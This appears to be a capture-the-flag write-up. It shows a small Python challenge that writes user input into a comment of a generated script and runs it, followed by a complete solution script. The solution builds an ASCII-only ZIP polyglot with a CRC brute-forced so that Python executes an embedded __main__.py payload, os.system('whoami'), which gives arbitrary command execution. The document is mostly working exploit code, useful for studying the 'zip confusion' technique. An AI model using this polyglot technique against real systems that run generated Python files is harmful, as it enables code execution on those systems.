```py -cwn
#!/usr/bin/env python3
import tempfile
import subprocess
import os
 
comment = input("> ").replace("\n", "").replace("\r", "")
 
code = f"""print("hello world!")
# This is a comment. Here's another:
# {comment}
print("Thanks for playing!")"""
 
with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
    f.write(code)
    temp_filename = f.name
 
try:
    result = subprocess.run(
        ["python3", temp_filename], capture_output=True, text=True, timeout=5
    )
 
    if result.stdout:
        print(result.stdout, end="")
    if result.stderr:
        print(result.stderr, end="")
 
except subprocess.TimeoutExpired:
    print("Timeout")
finally:
    os.unlink(temp_filename)
```

#### Can be pwned

```py -cwn
# https://www.analogue.computer/blog/python-zip-confusion
# https://www.hacktron.ai/blog/python-zip-confusion
import io, struct, zipfile, pathlib
import itertools
import zlib
import subprocess
 
JUNK_HEAD = """print("hello world!")
# This is a comment. Here's another:
# """.encode()
JUNK_TAIL = """
print("Thanks for playing!")"""
 
FILENAME = b"__main__.py"
BODY     = b"__import__('os').system('whoami')#"
 
def ascii_safe(x: int) -> bool:
    """True if all four bytes have high bit clear."""
    return all(((x >> (8 * i)) & 0x80) == 0 for i in range(4))
 
def find_suffix(core: bytes, length: int = 4) -> bytes:
    """Brute-force an ASCII suffix of given length making CRC 32 valid."""
    printable = range(0x20, 0x7F)         # space … tilde
    for tail in itertools.product(printable, repeat=length):
        payload = core + bytes(tail)
        crc     = zlib.crc32(payload) & 0xFFFFFFFF
        if ascii_safe(crc):
            return bytes(tail), crc
    raise RuntimeError("unexpected: no suffix found")
 
SUFFIX, CRC = find_suffix(BODY)
PAYLOAD     = BODY + SUFFIX
SIZE        = len(PAYLOAD)
 
def le32(x): return struct.pack("<I", x)
def le16(x): return struct.pack("<H", x)
 
SIG_LFH  = 0x04034B50
SIG_CDH  = 0x02014B50
SIG_EOCD = 0x06054B50
 
# --------------------------------------------------------------------
# build the ZIP file
# --------------------------------------------------------------------
 
delta = len(JUNK_HEAD)
 
# Local file header
lfh  = le32(SIG_LFH)
lfh += le16(0)          # version needed to extract
lfh += le16(0)          # general purpose bit flag
lfh += le16(0)          # compression method = stored
lfh += le16(0)          # last mod file time
lfh += le16(0)          # last mod file date
lfh += le32(CRC)
lfh += le32(SIZE)       # compressed size
lfh += le32(SIZE)       # uncompressed size
lfh += le16(len(FILENAME))
lfh += le16(0)          # extra field length
lfh += FILENAME
 
# Central directory header
cdh  = le32(SIG_CDH)
cdh += le16(0)          # version made by
cdh += le16(0)          # version needed
cdh += le16(0)          # flags
cdh += le16(0)          # method
cdh += le16(0)          # time
cdh += le16(0)          # date
cdh += le32(CRC)
cdh += le32(SIZE)
cdh += le32(SIZE)
cdh += le16(len(FILENAME))
cdh += le16(0)          # extra len
cdh += le16(0)          # comment len
cdh += le16(0)          # disk #
cdh += le16(0)          # int attrs
cdh += le32(0)          # ext attrs
cdh += le32(delta)      # relative offset of LFH
cdh += FILENAME
 
# patch CD offset to make it ASCII safe
cd_offset = delta + len(lfh) + len(PAYLOAD)
 
pad = 0
while not ascii_safe(cd_offset + pad):
    pad += 1
padding = b'\x00' * pad
 
cd_offset += pad
 
# end of central directory record
eocd  = le32(SIG_EOCD)
eocd += le16(0)         # disk #
eocd += le16(0)         # disk where CD starts
eocd += le16(1)         # # entries on this disk
eocd += le16(1)         # total # entries
eocd += le32(len(cdh))  # size of central directory
eocd += le32(cd_offset) # offset of CD
eocd += le16(len(JUNK_TAIL)) # ZIP comment length
 
zip_bytes = lfh + PAYLOAD + padding + cdh + eocd
zip_bytes = bytearray(zip_bytes)
assert all(b < 0x80 for b in zip_bytes), "non-ASCII byte detected!"
 
# --------------------------------------------------------------------
# solve the challenge
# --------------------------------------------------------------------
 
with open("polyglot.zip", "wb") as f:
    f.write(JUNK_HEAD + zip_bytes + JUNK_TAIL.encode())
 
# Run locally: feed the payload to test/main.py via stdin
proc = subprocess.run([
    "python",
    "main.py",
], input=zip_bytes.decode('latin-1'), text=True, capture_output=True)
if proc.stdout:
    print(proc.stdout, end="")
if proc.stderr:
    print(proc.stderr, end="")
```